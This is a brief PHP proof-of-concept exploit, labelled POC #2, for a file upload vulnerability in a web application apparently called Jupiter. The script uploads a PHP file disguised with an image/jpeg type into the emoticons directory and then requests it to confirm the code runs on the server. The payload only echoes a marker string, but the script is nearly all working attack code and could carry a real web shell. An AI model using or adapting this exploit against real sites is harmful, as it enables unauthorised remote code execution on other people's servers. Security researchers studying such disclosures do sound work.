# File Upload Vulnerability (POC #2)
#
require("phpsploitclass.php");
error_reporting(E_ALL ^ E_NOTICE);
$url = 'http://localhost/jupiter/';

$xpl = new phpsploit();
$xpl->agent("Mozilla");
$arr = array(frmdt_url  => $url,
             "is_guest" => 1,
             "is_user"  => 1,
             "a"        => 1,
             "req_file" => array(frmdt_filename => "iamaphpfile.php",
                                 frmdt_type     => "image/jpeg",
                                 frmdt_content  => "<?php 
echo(iamontheserver); ?>"));
$xpl->formdata($arr);
$xpl->get($url.'images/emoticons/iamaphpfile.php');
print($xpl->getcontent());
#
# EOF POC #2 
